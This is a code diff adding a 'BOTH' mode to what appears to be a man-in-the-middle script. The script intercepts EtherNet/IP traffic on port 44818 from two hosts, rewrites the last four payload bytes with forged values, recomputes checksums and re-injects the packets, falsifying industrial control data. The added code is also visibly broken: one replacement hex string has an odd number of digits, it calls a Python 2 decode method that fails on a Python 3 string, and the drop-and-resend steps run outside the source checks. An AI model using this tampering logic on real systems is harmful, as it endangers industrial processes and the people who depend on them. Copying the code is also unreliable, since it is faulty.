@@ -44,6 +44,28 @@ def modify(packet):
                 del pkt[TCP].chksum
         packet.drop()
         send(pkt)
+    elif (sys.argv[1] == 'BOTH'):
+        if pkt.haslayer(TCP) and pkt.getlayer(TCP).sport == 44818:
+            if pkt[IP].src == '10.0.0.2':
+                if pkt.haslayer(Raw) and len(pkt.getlayer(Raw).load) == 50:
+                    mydata = binascii.hexlify(bytes(pkt[Raw].load)).decode()
+                    newdata = mydata[:-8]+'0000c03f'
+                    print(newdata)
+                    pkt[Raw].load = newdata.decode('hex')
+                    del pkt[IP].chksum
+                    del pkt[TCP].chksum
+            packet.drop()
+            send(pkt)
+            if pkt[IP].src == '10.0.0.3':
+                if pkt.haslayer(Raw) and len(pkt.getlayer(Raw).load) == 50:
+                    mydata = binascii.hexlify(bytes(pkt[Raw].load)).decode()
+                    newdata = mydata[:-8]+'7fb9b223f'
+                    print(newdata)
+                    pkt[Raw].load = newdata.decode('hex')
+                    del pkt[IP].chksum
+                    del pkt[TCP].chksum
+            packet.drop()
+            send(pkt)
     else:
         print('Invalid option!!')
 
